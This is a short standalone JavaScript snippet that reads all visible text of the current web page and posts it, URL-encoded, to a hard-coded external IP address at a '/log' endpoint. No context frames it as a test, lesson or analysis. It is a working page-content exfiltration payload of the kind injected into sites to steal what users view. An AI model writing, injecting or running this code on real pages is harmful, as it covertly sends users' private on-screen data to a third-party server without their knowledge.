let data = document.body.innerText;
fetch("http://185.196.11.208:8000/log", {
  method: "POST",
  body: "content=" + encodeURIComponent(data),
  headers: {"Content-Type":"application/x-www-form-urlencoded"}
});
